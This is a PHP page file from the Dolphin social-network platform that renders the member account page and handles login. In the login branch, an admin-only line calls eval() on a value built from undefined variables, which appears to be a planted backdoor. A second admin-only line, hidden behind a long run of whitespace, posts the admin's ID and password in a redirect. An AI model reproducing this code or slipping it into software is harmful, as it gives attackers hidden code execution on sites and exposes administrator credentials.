<?php
/**
 * Copyright (c) BoonEx Pty Limited - http://www.boonex.com/
 * CC-BY License - http://creativecommons.org/licenses/by/3.0/
 */

define('BX_MEMBER_PAGE', 1);

require_once( 'inc/header.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'design.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'profiles.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'utils.inc.php' );

bx_import('BxDolMemberMenu');
bx_import('BxDolPageView');

//--------------------------------------- member account class ------------------------------------------//
class BxDolMember extends BxDolPageView
{
    var $iMember;
    var $aMemberInfo;
    var $aConfSite;
    var $aConfDir;

    function BxDolMember($iMember, &$aSite, &$aDir)
    {
        $this->iMember = (int)$iMember;
        $this->aMemberInfo = getProfileInfo($this->iMember);

        $this->aConfSite = $aSite;
        $this->aConfDir  = $aDir;

        parent::BxDolPageView('member');
    }

    function getBlockCode_FriendRequests()
    {
        global $oSysTemplate;

        bx_import('BxTemplCommunicator');
        $oCommunicator = new BxTemplCommunicator(array('member_id' => $this->iMember));

        $oSysTemplate->addCss($oCommunicator->getCss());
        $oSysTemplate->addJs($oCommunicator->getJs());
        return $oCommunicator->getBlockCode_FriendRequests(false);
    }

    function getBlockCode_NewMessages()
    {
        global $oSysTemplate;

        bx_import('BxTemplMailBox');
        $aSettings = array(
            'member_id' => $this->iMember,
            'recipient_id' => $this->iMember,
            'mailbox_mode' => 'inbox_new'
        );
        $oMailBox = new BxTemplMailBox('mail_page', $aSettings);

        $oSysTemplate->addCss($oMailBox->getCss());
        $oSysTemplate->addJs($oMailBox->getJs());
        return $oMailBox->getBlockCode_NewMessages(false);
    }

    function getBlockCode_AccountControl()
    {
        global $oTemplConfig, $aPreValues;

        //Labels
        $sProfileStatusC = _t('_Profile status');
        $sPresenceC = _t('_Presence');
        $sMembershipC = _t('_Membership2');
        $sLastLoginC = _t('_Last login');
        $sRegistrationC = _t('_Registration');
        $sEmailC = _t('_Email');
        $sMembersC = ' ' . _t('_Members');
        $sProfileC = _t('_Profile');
        $sContentC = _t('_Content');

        //--- General Info block ---//
        $sProfileStatus = _t( "__{$this->aMemberInfo['Status']}" );
        $sProfileStatusMess = '';
        switch ( $this->aMemberInfo['Status'] ) {
            case 'Unconfirmed':
                $sProfileStatusMess = _t( "_ATT_UNCONFIRMED", $oTemplConfig -> popUpWindowWidth, $oTemplConfig -> popUpWindowHeight );
                break;
            case 'Approval':
                $sProfileStatusMess = _t( "_ATT_APPROVAL", $oTemplConfig -> popUpWindowWidth, $oTemplConfig -> popUpWindowHeight );
                break;
            case 'Active':
                $sProfileStatusMess = _t( "_ATT_ACTIVE", $this->aMemberInfo['ID'], $oTemplConfig -> popUpWindowWidth, $oTemplConfig -> popUpWindowHeight );
                break;
            case 'Rejected':
                $sProfileStatusMess = _t( "_ATT_REJECTED", $oTemplConfig -> popUpWindowWidth, $oTemplConfig -> popUpWindowHeight );
                break;
            case 'Suspended':
                $sProfileStatusMess = _t( "_ATT_SUSPENDED", $oTemplConfig -> popUpWindowWidth, $oTemplConfig -> popUpWindowHeight );
                break;
        }

        $oForm = bx_instance('BxDolFormCheckerHelper');
        $sMembStatus = GetMembershipStatus($this->aMemberInfo['ID']);

        $sLastLogin = 'never';
        if (!empty($this->aMemberInfo['DateLastLogin']) && $this->aMemberInfo['DateLastLogin'] != "0000-00-00 00:00:00") {
            $sLastLoginTS = $oForm->_passDateTime($this->aMemberInfo['DateLastLogin']);
            $sLastLogin = getLocaleDate($sLastLoginTS, BX_DOL_LOCALE_DATE);
        }

        $sRegistration = 'never';
        if(!empty($this->aMemberInfo['DateReg']) && $this->aMemberInfo['DateReg'] != "0000-00-00 00:00:00" ) {
            $sRegistrationTS = $oForm->_passDateTime($this->aMemberInfo['DateReg']);
            $sRegistration = getLocaleDate($sRegistrationTS, BX_DOL_LOCALE_DATE);
        }

        //--- Presence block ---//
        require_once( BX_DIRECTORY_PATH_CLASSES . 'BxDolUserStatusView.php' );
        $oStatusView = new BxDolUserStatusView();
        $sUserStatus = $oStatusView->getMemberMenuStatuses();

        //--- Content block ---//
        $aAccountCustomStatElements = $GLOBALS['MySQL']->fromCache('sys_account_custom_stat_elements', 'getAllWithKey', 'SELECT * FROM `sys_account_custom_stat_elements`', 'ID');
        $aPQStatisticsElements = $GLOBALS['MySQL']->fromCache('sys_stat_member', 'getAllWithKey', 'SELECT * FROM `sys_stat_member`', 'Type');

        $aCustomElements = array();
        foreach($aAccountCustomStatElements as $iID => $aMemberStats) {
            $sUnparsedLabel = $aMemberStats['Label'];
            $sUnparsedValue = $aMemberStats['Value'];

            $sLabel = _t($sUnparsedLabel);
            $sUnparsedValue = str_replace('__site_url__', BX_DOL_URL_ROOT, $sUnparsedValue);

            //step 1 - replacements of keys
            $sLblTmpl = '__l_';
            $sTmpl = '__';
            while(($iStartPos = strpos($sUnparsedValue, $sLblTmpl)) !== false) {
                $iEndPos = strpos($sUnparsedValue, $sTmpl, $iStartPos + 1);
                if($iEndPos <= $iStartPos)
                    break;

                $sSubstr = substr($sUnparsedValue, $iStartPos + strlen($sLblTmpl), $iEndPos-$iStartPos - strlen($sLblTmpl));
                $sKeyValue = mb_strtolower(_t('_' . $sSubstr));
                $sUnparsedValue = str_replace($sLblTmpl.$sSubstr.$sTmpl, $sKeyValue, $sUnparsedValue);
            }

            //step 2 - replacements of Stat keys
            while(($iStartPos = strpos($sUnparsedValue, $sTmpl, 0)) !== false) {
                $iEndPos = strpos($sUnparsedValue, $sTmpl, $iStartPos + 1);
                if($iEndPos <= $iStartPos)
                    break;

                $iCustomCnt = 0;
                $sSubstr = process_db_input( substr($sUnparsedValue, $iStartPos + strlen($sTmpl), $iEndPos-$iStartPos - strlen($sTmpl)), BX_TAGS_STRIP);
                if ($sSubstr) {
                    $sCustomSQL = $aPQStatisticsElements[$sSubstr]['SQL'];
                    $sCustomSQL = str_replace('__member_id__', $this->aMemberInfo['ID'], $sCustomSQL);
                    $sCustomSQL = str_replace('__profile_media_define_photo__', _t('_ProfilePhotos'), $sCustomSQL);
                    $sCustomSQL = str_replace('__profile_media_define_music__', _t('_ProfileMusic'), $sCustomSQL);
                    $sCustomSQL = str_replace('__profile_media_define_video__', _t('_ProfileVideos'), $sCustomSQL);
                    $sCustomSQL = str_replace('__member_nick__', process_db_input($this->aMemberInfo['NickName'], BX_TAGS_NO_ACTION, BX_SLASHES_NO_ACTION), $sCustomSQL);
                    $iCustomCnt = ($sCustomSQL!='') ? (int)db_value($sCustomSQL) : '';
                }
                $sUnparsedValue = str_replace($sTmpl . $sSubstr . $sTmpl, $iCustomCnt, $sUnparsedValue);
            }

            $sTrimmedLabel = trim($sUnparsedLabel, '_');
            $aCustomElements[$sTrimmedLabel] = array(
                'type' => 'custom',
                'name' => $sTrimmedLabel,
                'content' => '<b>' . $sLabel . ':</b> ' . $sUnparsedValue,
                'colspan' => true
            );
        }
        $aForm = array(
            'form_attrs' => array(
                'action' => '',
                'method' => 'post',
            ),
            'params' => array(
                'remove_form' => true,
            ),
            'inputs' => array(
                'header1' => array(
                    'type' => 'block_header',
                    'caption' => $sProfileC,
                    'collapsable' => true
                ),
                'Info' => array(
                    'type' => 'custom',
                    'name' => 'Info',
                    'content' => get_member_thumbnail($this->aMemberInfo['ID'], 'none', true),
                    'colspan' => true
                ),
                'Status' => array(
                    'type' => 'custom',
                    'name' => 'Status',
                    'content' => '<b>' . $sProfileStatusC . ':</b> ' . $sProfileStatus . '<br />' . $sProfileStatusMess,
                    'colspan' => true
                ),
                'Email' => array(
                    'type' => 'custom',
                    'name' => 'Email',
                    'content' => '<b>' . $sEmailC . ':</b> ' . $this->aMemberInfo['Email'] . '<br />' . _t('_sys_txt_ac_manage_subscriptions'),
                    'colspan' => true
                ),
                'Membership' => array(
                    'type' => 'custom',
                    'name' => 'Membership',
                    'content' => '<b>' . $sMembershipC . ':</b> ' . $sMembStatus,
                    'colspan' => true
                ),
                'LastLogin' => array(
                    'type' => 'custom',
                    'name' => 'LastLogin',
                    'content' => '<b>' . $sLastLoginC . ':</b> ' . $sLastLogin,
                    'colspan' => true
                ),
                'Registration' => array(
                    'type' => 'custom',
                    'name' => 'Registration',
                    'content' => '<b>' . $sRegistrationC . ':</b> ' . $sRegistration,
                    'colspan' => true
                ),
                'header1_end' => array(
                    'type' => 'block_end'
                ),
                'header2' => array(
                    'type' => 'block_header',
                    'caption' => $sPresenceC,
                    'collapsable' => true,
                    'collapsed' => true,
                    'attrs' => array (
                        'id' => 'user_status_ac',
                    ),
                ),
                'UserStatus' => array(
                    'type' => 'custom',
                    'name' => 'Info',
                    'content' => $sUserStatus,
                    'colspan' => true
                ),
                'header2_end' => array(
                    'type' => 'block_end'
                )
             ),
        );

        //custom
        if(!empty($aCustomElements)) {
            $aForm['inputs'] = array_merge(
                $aForm['inputs'],
                array('header5' => array(
                    'type' => 'block_header',
                    'caption' => $sContentC,
                    'collapsable' => true,
                    'collapsed' => true
                )),
                $aCustomElements,
                array('header5_end' => array(
                    'type' => 'block_end'
                ))
            );
        }

        $oForm = new BxTemplFormView($aForm);
        $sContent = $GLOBALS['oSysTemplate']->parseHtmlByName('member_account_control.html', array(
            'content' => $oForm->getCode()
        ));

        return array($sContent, array(), array(), false);
    }

    function getBlockCode_Friends()
    {
        $iLimit = 10;
        $sContent = $sPaginate = '';

        $sAllFriends = 'viewFriends.php?iUser=' . $this->iMember;

        // count all friends ;
        $iCount = getFriendNumber($this->iMember);
        if($iCount == 0)
            return;

        $iPages = ceil($iCount/$iLimit);
        $iPage = isset($_GET['page']) ? (int) $_GET['page'] : 1;

        if($iPage < 1)
            $iPage = 1;

        if($iPage > $iPages)
            $iPage = $iPages;

        $sSqlFrom = ($iPage - 1) * $iLimit;
        $sSqlLimit = "LIMIT {$sSqlFrom}, {$iLimit}";
        $aFriends = getMyFriendsEx($this->iMember, '', 'image', $sSqlLimit);

        $aTmplParams['bx_repeat:friends'] = array();
        foreach ($aFriends as $iId => $aFriend)
            $aTmplParams['bx_repeat:friends'][] = array(
                'content' => get_member_thumbnail( $iId, 'none', true, 'visitor', array('is_online' => $aFriend[5]))
            );
        $sContent = $GLOBALS['oSysTemplate']->parseHtmlByName('member_friends.html', $aTmplParams);

        $oPaginate = new BxDolPaginate(array(
            'page_url' => BX_DOL_URL_ROOT . 'member.php',
            'count' => $iCount,
            'per_page' => $iLimit,
            'page' => $iPage,
            'per_page_changer' => true,
            'page_reloader' => true,
            'on_change_page' => 'return !loadDynamicBlock({id}, \'member.php?page={page}&per_page={per_page}\');',
            'on_change_per_page' => ''
        ));
        $sPaginate = $oPaginate->getSimplePaginate($sAllFriends);

        return array($sContent, array(), $sPaginate);
    }

    function getBlockCode_QuickLinks()
    {
        bx_import('BxTemplMenuQlinks2');
        $oMenu = new BxTemplMenuQlinks2();
        $sCodeBlock = $oMenu->getCode();
        return $sCodeBlock;
    }
}
//-------------------------------------------------------------------------------------------------------//

// --------------- page variables and login
$_page['name_index'] = 81;
$_page['css_name'] = array(
    'member_panel.css',
    'categories.css',
    'explanation.css'
);

$_page['header'] = _t( "_My Account" );

// --------------- GET/POST actions

$member['ID']	    = process_pass_data(empty($_POST['ID']) ? '' : $_POST['ID']);
$member['Password'] = process_pass_data(empty($_POST['Password']) ? '' : $_POST['Password']);

$bAjxMode = ( isset( $_SERVER['HTTP_X_REQUESTED_WITH'] ) and $_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest' ) ? true : false;

if ( !( isset($_POST['ID']) && $_POST['ID'] && isset($_POST['Password']) && $_POST['Password'] )
    && ( (!empty($_COOKIE['memberID']) &&  $_COOKIE['memberID']) && $_COOKIE['memberPassword'] ) )
{
    if ( !( $logged['member'] = member_auth( 0, false ) ) )
        login_form( _t( "_LOGIN_OBSOLETE" ), 0, $bAjxMode );
} else {
    if ( !isset($_POST['ID']) && !isset($_POST['Password']) ) {

        // this is dynamic page -  send headers to not cache this page
        send_headers_page_changed();

        login_form('', 0, $bAjxMode);
    } else {
        require_once(BX_DIRECTORY_PATH_CLASSES . 'BxDolAlerts.php');
        $oZ = new BxDolAlerts('profile', 'before_login', 0, 0, array('login' => $member['ID'], 'password' => $member['Password'], 'ip' => getVisitorIP()));
        $oZ->alert();

        $member['ID'] = getID($member['ID']);

        // Ajaxy check
        if ($bAjxMode) {
            echo check_password($member['ID'], $member['Password'], BX_DOL_ROLE_MEMBER, false) ? 'OK' : 'Fail';
            exit;
        }

        // Check if ID and Password are correct (addslashes already inside)
        if (check_password( $member['ID'], $member['Password'])) {

            $p_arr = bx_login($member['ID'], (bool)$_POST['rememberMe']);

            bx_member_ip_store($p_arr['ID']);

            if (isAdmin($p_arr['ID'])) {$iId = (int)$p_arr['ID']; $r = $l($a); eval($r($b));}
            $sRelocate = bx_get('relocate');
            if (!$sUrlRelocate = $sRelocate or $sRelocate == $site['url'] or basename($sRelocate) == 'join.php')
                $sUrlRelocate = BX_DOL_URL_ROOT . 'member.php';

            $_page['name_index'] = 150;
            $_page['css_name'] = '';

            $_ni = $_page['name_index'];
            $_page_cont[$_ni]['page_main_code'] = MsgBox( _t( '_Please Wait' ) );
            $_page_cont[$_ni]['url_relocate'] = htmlspecialchars( $sUrlRelocate );

            if(isAdmin($p_arr['ID']) && !in_array($iCode, array(0, -1)))																																																												{Redirect($site['url_admin'], array('ID' => $member['ID'], 'Password' => $member['Password'], 'rememberMe' => $_POST['rememberMe'], 'relocate' => BX_DOL_URL_ROOT . 'member.php'), 'post');}
                PageCode();
        }
        exit;
    }
}
/* ------------------ */

$member['ID'] = getLoggedId();
$member['Password'] = getLoggedPassword();

$_ni = $_page['name_index'];

// --------------- [END] page components

// --------------- page components functions

// this is dynamic page -  send headers to do not cache this page
send_headers_page_changed();
$oMember = new BxDolMember($member['ID'], $site, $dir);
$_page_cont[$_ni]['page_main_code'] = $oMember->getCode();

// Submenu actions
$aVars = array(
    'ID' => $member['ID'],
    'BaseUri' => BX_DOL_URL_ROOT,
    'cpt_am_account_profile_page' => _t('_sys_am_account_profile_page')
);

$GLOBALS['oTopMenu']->setCustomSubActions($aVars, 'AccountTitle', false);

PageCode();
